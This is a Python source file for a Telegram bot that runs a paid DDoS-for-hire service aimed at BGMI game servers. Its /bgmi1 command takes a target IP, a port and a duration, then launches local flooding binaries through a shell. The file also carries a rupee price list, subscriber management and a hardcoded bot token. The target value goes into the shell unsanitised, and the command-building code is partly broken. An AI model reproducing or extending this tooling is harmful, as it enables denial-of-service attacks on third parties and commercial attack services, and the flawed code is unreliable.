#script by  @R2FSUNILYT

import telebot
import subprocess
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7634723065:AAFYmYLjPMghtL5Yau7skGUT0wOJRnXv5mM')

# Admin user IDs
admin_id = ["1661744209"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["5588464519"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝙇𝙊𝙂𝙎 𝘾𝙇𝙀𝘼𝙍 𝘼𝙇𝙍𝙀𝘼𝘿𝙔"
            else:
                file.truncate(0)
                response = "𝘾𝙇𝙀𝘼𝙍 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 ✅"
    except FileNotFoundError:
        response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "𝗛𝗢𝗪 𝗧𝗢 𝗔𝗗𝗗 𝗨𝗦𝗘𝗥𝗦\n★[ʟɪᴋᴇ --> 1 ᴅᴀʏꜱ , 2 ᴅᴀʏꜱ , 1 ᴡᴇᴇᴋ]★"
    else:
        response = "🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗕𝗨𝗬 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗖𝗢𝗡𝗧𝗘𝗖𝗧 𝗢𝗪𝗡𝗘𝗥 - 𝗗𝗠 - @RAHUL_DDOS_B"

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>`{user_id}`</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝙍𝙀𝙈𝙊𝙑𝙀 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔👍"
            else:
                response = f"𝙐𝙎𝙀𝙍 𝘿𝘼𝙏𝘼 𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
        else:
            response = '''ᴛʀʏ ᴛᴏ ᴛʜɪꜱ ᴛʏᴘᴇ --> /ʀᴇᴍᴏᴠᴇ (ᴜꜱᴇʀ_ɪᴅ)'''
    else:
        response = "𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙉𝙊𝙏 𝙔𝙊𝙐"

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝙇𝙊𝙂𝙎 𝘾𝙇𝙀𝘼𝙍 𝘼𝙇𝙍𝙀𝘼𝘿𝙔"
                else:
                    file.truncate(0)
                    response = "𝘾𝙇𝙀𝘼𝙍 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 ✅"
        except FileNotFoundError:
            response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
    else:
        response = "𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙉𝙊𝙏 𝙔𝙊𝙐"
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
                else:
                    file.truncate(0)
                    response = "𝘾𝙇𝙀𝘼𝙍 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 ✅"
        except FileNotFoundError:
            response = "𝗖𝗟𝗘𝗔𝗥 𝗟𝗢𝗚𝗢 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 ✅"
    else:
        response = "🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗕𝗨𝗬 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗖𝗢𝗡𝗧𝗘𝗖𝗧 𝗢𝗪𝗡𝗘𝗥 - 𝗗𝗠 - @RAHUL_DDOS_B"
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
        except FileNotFoundError:
            response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
    else:
        response = "🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗕𝗨𝗬 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗖𝗢𝗡𝗧𝗘𝗖𝗧 𝗢𝗪𝗡𝗘𝗥 - 𝗗𝗠 - @RAHUL_DDOS_B"
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
                bot.reply_to(message, response)
        else:
            response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
            bot.reply_to(message, response)
    else:
        response = "🚫𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗕𝗨𝗬 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗖𝗢𝗡𝗧𝗘𝗖𝗧 𝗢𝗪𝗡𝗘𝗥- 𝗗𝗠 - @RAHUL_DDOS_B"
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🤍 जय श्री राम  🚩🚩 - {username} \n 🔴 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 🔴\n\n𝗧𝗔𝗥𝗚𝗘𝗧 - {target}\n𝗣𝗢𝗥𝗧 - {port}\n𝗧𝗔𝗜𝗠𝗘 {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝗚𝗔𝗠𝗘 - 🇮🇳 𝗕𝗚𝗠𝗜 𝟯.𝟰 🟢\n\n彡🤍 जय श्री राम  🚩🚩 𝗕𝗨𝗬 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 - @RAHUL_DDOS_B"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi1'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "🛑ƈօօʟɖօառ ɮʀօ🛑"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 240:
                response = "⚠️ 𝐢𝐧𝐯𝐚𝐥𝐢𝐝 𝐟𝐨𝐫𝐦𝐚𝐭 ⚠️𝐦𝐮𝐬𝐭 𝐛𝐞 𝐥𝐞𝐬𝐬 𝐭𝐡𝐚𝐧 𝟐𝟒𝟎."
            else:
                record_command_logs(user_id, '/bgmi1', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./adarsh {target} {port} {time} 50", "./adarsh1 {target} {port} {time} 10"
                process = subprocess.run(full_command, shell=True)
                response = f"𝗔𝗧𝗧𝗔𝗖𝗞 ♦️ 1♦️𝗘𝗡𝗗 🟢\n\n𝐓𝐀𝐑𝐆𝐄𝐓 --> {target}\n𝐏𝐎𝐑𝐓 --> {port}\n𝐓𝐈𝐌𝐄 --> {time} 𝐒𝐄𝐂.\n\n🌹@RAHUL_DDOS_B"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "⚠️1 𝗥𝗘𝗗𝗔𝗬 𝗧𝗢 𝗔𝗧𝗧𝗔𝗖𝗞𝗔𝗧𝗧𝗔𝗖𝗞 ✅\n\n/ʙɢᴍɪ1 <ᴛᴀʀɢᴇᴛ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\nₑₓ. ₋ ₂₅₇.₆₄.₅₅.₇ ₁₂₃₄₅ ₂₄₀\n𝗦𝗔𝗡𝗗 𝗙𝗘𝗘𝗕𝗔𝗖𝗞 - @R2FSUNILYT\n\n★[🤍 जय श्री राम  🚩🚩]★"  # Updated command syntax
    else:
        response = ("𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘  𝗕𝗨𝗬 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗗𝗠 - @RAHUL_DDOS_B")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗."
        except FileNotFoundError:
            response = "𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗"
    else:
        response = "ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @RAHUL_DDOS_B"

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨:
💥 /bgmi1
💥 /rules
💥 /mylogs
💥 /plan 
💥 /myinfo

𝘽𝙪𝙮 :- @gahtak
𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 :- @gahtak and that's brother @gahtak 
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🌹𝗪𝗘𝗟𝗖𝗢𝗠 𝗧𝗢 𝗥𝟮𝗙 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧🌹, {𝘂𝘀𝗲𝗿_𝗻𝗮𝗺𝗲} 𝗕𝗨𝗬 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 💲𝗗𝗠 - @RAHUL_DDOS_B.
💬 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗕𝗼𝗧 - /help
✅BUY :- @RAHUL_DDOS_B'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''𝙉𝙊 𝙍𝙐𝙇𝙀𝙎 🤗🤗'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''𝙃𝙚𝙮 - {user_name}

 🌀 𝗙𝗲𝗮𝘁𝘂𝗿𝘀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗗𝗱𝗼𝘀 𝗕𝗼𝘁🔰
🔴 𝗔𝗧𝗧𝗔𝗖𝗞 𝗠𝗔𝗫 𝗧𝗔𝗜𝗠𝗘 𝟯𝟬𝟬. 𝘀𝗲𝗰🕛
🔵 𝟭 𝗠𝗔𝗧𝗖𝗛 𝟱 𝗧𝗔𝗜𝗠𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 ✅
🟣 𝗔𝗙𝗧𝗔𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗜𝗠𝗜𝗧 𝟭𝟬 sec🕧
🟢 𝗢𝗡𝗘 𝗧𝗔𝗜𝗠𝗘 𝟮 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 ✅

💸 DDOSE PRICE LIST 💸
💵1 Day         -    ₹ 120/-
💵1 Week      -    ₹ 599/-
💵1 Month    -    ₹ 1499/-
💵2 Month    -    ₹ 1999/-
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


